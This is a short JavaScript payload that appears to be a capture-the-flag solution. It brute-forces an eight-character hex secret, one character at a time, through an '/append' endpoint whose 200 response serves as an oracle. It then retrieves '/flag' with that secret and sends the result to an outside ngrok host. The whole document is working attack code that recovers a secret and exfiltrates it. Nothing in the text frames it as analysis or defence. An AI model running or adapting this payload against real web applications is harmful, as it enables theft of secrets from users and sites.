async function leak() {
  const EXFIL = 'https://f436-172-245-102-15.ngrok-free.app';
  const hex = '0123456789abcdef';
  let secret = '';

  for (let i = 0; i < 8; i++) {
    for (const c of hex) {
      const res = await fetch('/append?content=' + encodeURIComponent(secret + c) + '&url=' + encodeURIComponent(location.origin + '/'));
      if (res.status === 200) {
        secret += c;
        break;
      }
    }
  }

  const flag = await (await fetch('/flag?secret=' + secret)).text();
  fetch(EXFIL + '/?flag=' + encodeURIComponent(flag));
}
leak();
